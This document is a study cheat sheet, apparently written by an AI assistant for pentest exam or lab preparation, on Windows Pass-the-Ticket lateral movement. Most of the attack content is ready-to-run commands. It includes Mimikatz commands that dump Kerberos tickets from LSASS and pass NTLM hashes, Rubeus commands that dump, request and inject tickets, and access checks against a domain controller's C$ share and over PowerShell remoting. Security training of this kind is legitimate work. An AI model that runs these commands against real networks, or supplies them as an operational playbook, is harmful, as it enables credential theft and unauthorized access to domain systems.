
---

> [!info] Pass the Ticket (PtT) – Windows  
> PtT = lateral movement using **stolen Kerberos tickets (.kirbi)** instead of passwords or NTLM hashes.

---

## Kerberos Ticket Types

> [!abstract] Core Tickets

- **TGT (Ticket Granting Ticket)** → Used to request other tickets (full access path)
    
- **TGS (Ticket Granting Service)** → Grants access to a specific service (SMB, LDAP, CIFS, MSSQL)
    

---

## Where Tickets Live

> [!info] LSASS Storage

- Kerberos tickets are stored in **LSASS (Local Security Authority Subsystem Service)**
    
- Access level:
    
    - User → only own tickets
        
    - Local Admin → can dump all tickets
        

---

## Ticket Extraction (Windows)

### Mimikatz

> [!example] Dump Tickets

```cmd
privilege::debug
sekurlsa::tickets /export
```

- Outputs: `.kirbi` files
    
- Format:
    
    ```
    [random]-LUID-type-flags-username@service-domain.kirbi
    ```
    

> [!note]

- `krbtgt` in filename → **TGT (Golden Ticket-relevant context)**
    
- `$` → **computer account (machine identity tickets)**
    

---

### Rubeus (Dump)

> [!example] Dump Tickets (Base64)

```cmd
Rubeus.exe dump /nowrap
```

- Outputs:
    
    - Base64 encoded ticket
        
    - Metadata (service, user, lifetime, flags)
        

---

## OverPass-the-Hash (Pass-the-Key)

> [!warning] Concept  
> Convert **NTLM / AES key → TGT**

### Mimikatz

```cmd
sekurlsa::ekeys
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
```

- Spawns new process with Kerberos context
    

---

### Rubeus (Ask TGT)

```cmd
Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<key>
```

- Produces valid **TGT in Base64 or session**
    

---

## Pass the Ticket (PtT Execution)

> [!success] Goal  
> Inject `.kirbi` or Base64 ticket into current session

---

### Rubeus (Import Ticket)

```cmd
Rubeus.exe ptt /ticket:<kirbi-file>
```

or

```cmd
Rubeus.exe ptt /ticket:<base64-ticket>
```

---

### Mimikatz (Import Ticket)

```cmd
kerberos::ptt <path-to-kirbi>
```

---

## Verification (Lateral Movement)

> [!check] Test Access

```cmd
dir \\DC01\c$
Enter-PSSession -ComputerName DC01
```

If successful:

- You are authenticated as **impersonated Kerberos identity**
    
- No password used during access
    

---

## PowerShell Remoting with PtT

> [!info] Requirements

- WinRM enabled (TCP 5985/5986)
    
- Valid Kerberos ticket in session
    

```powershell
Enter-PSSession -ComputerName <target>
```

---

## Key Takeaways

> [!tldr]

- PtT = reuse Kerberos tickets for authentication
    
- LSASS is the primary ticket source
    
- Tools:
    
    - Mimikatz → extraction + injection
        
    - Rubeus → dumping, forging, importing
        
- Works for:
    
    - SMB
        
    - LDAP
        
    - CIFS
        
    - PowerShell Remoting
        

---

If you want next step, I can compress this further into a **cheat-sheet command block only (no theory)** for exam/lab speed use.